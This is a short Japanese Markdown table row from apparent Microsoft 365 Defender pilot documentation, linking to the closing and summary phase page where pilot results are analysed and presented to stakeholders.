|![終了フェーズと概要フェーズ](../../media/mtp/close.png) <br>[終了フェーズと概要フェーズ](m365d-pilot-close.md)|Microsoft 365 Defenderパイロットの成果を分析し、関係者に提示し、次のステップに進みます。
|:-----|:-----|
